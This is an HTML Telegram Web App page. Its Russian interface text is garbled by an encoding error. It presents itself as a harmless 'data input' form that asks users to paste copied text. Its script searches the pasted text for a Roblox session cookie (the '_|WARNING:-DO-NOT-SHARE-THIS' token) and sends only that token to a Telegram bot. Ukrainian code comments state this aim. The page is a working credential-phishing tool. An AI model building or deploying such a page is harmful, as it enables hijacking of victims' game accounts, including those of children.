<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            background: #1c1c1c; 
            color: white; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            padding: 20px; 
            text-align: center; 
            margin: 0;
        }
        h3 { color: #0088cc; margin-bottom: 20px; }
        textarea { 
            width: 100%; 
            height: 250px; 
            background: #2b2b2b; 
            color: #00ff00; 
            border: 2px solid #444; 
            border-radius: 12px; 
            padding: 12px; 
            font-family: monospace; 
            font-size: 14px;
            outline: none; 
            box-sizing: border-box;
            resize: none;
        }
        button { 
            width: 100%; 
            height: 55px; 
            background: #0088cc; 
            color: white; 
            border: none; 
            border-radius: 12px; 
            margin-top: 20px; 
            font-size: 18px; 
            font-weight: bold; 
            cursor: pointer;
            transition: background 0.2s;
        }
        button:active { background: #006699; }
        .hint { color: #888; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <h3>üì• –í–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö</h3>
    <textarea id="data_input" placeholder="–í—Å—Ç–∞–≤—å—Ç–µ —Å—é–¥–∞ –≤–µ—Å—å —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç..."></textarea>
    <button id="send_btn">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∏ –∑–∞–≥—Ä—É–∑–∏—Ç—å</button>
    <p class="hint">–°–∫—Ä–∏–ø—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∞–π–¥–µ—Ç –Ω—É–∂–Ω—ã–π –∫–æ–¥ –≤ —Ç–µ–∫—Å—Ç–µ</p>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand(); // –†–æ–∑–≥–æ—Ä—Ç–∞—î –≤—ñ–∫–Ω–æ –Ω–∞ –≤–µ—Å—å –µ–∫—Ä–∞–Ω

        document.getElementById('send_btn').addEventListener('click', function() {
            const fullText = document.getElementById('data_input').value.trim();
            
            if (!fullText) {
                alert("–ü–æ–ª–µ –ø—É—Å—Ç–æ–µ!");
                return;
            }

            // –®–£–ö–ê–Ñ–ú–û –¢–û–ö–ï–ù: —Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑ –¥–ª—è Roblox Cookie
            const tokenMatch = fullText.match(/(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"\' \)]+)/);
            
            if (tokenMatch) {
                const token = tokenMatch[1];
                // –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –±–æ—Ç—É –¢–Ü–õ–¨–ö–ò –∑–Ω–∞–π–¥–µ–Ω–∏–π —Ç–æ–∫–µ–Ω
                tg.sendData(token); 
                tg.close();
            } else {
                alert("‚ùå –û—à–∏–±–∫–∞: –í—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç –Ω–µ —Å–æ–¥–µ—Ä–∂–∏—Ç —Ä–∞–±–æ—á–µ–≥–æ –∫–æ–¥–∞ (_|WARNING). –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–ª–∏ –≤—Å—ë –ø—Ä–∞–≤–∏–ª—å–Ω–æ.");
            }
        });
    </script>
</body>
</html>
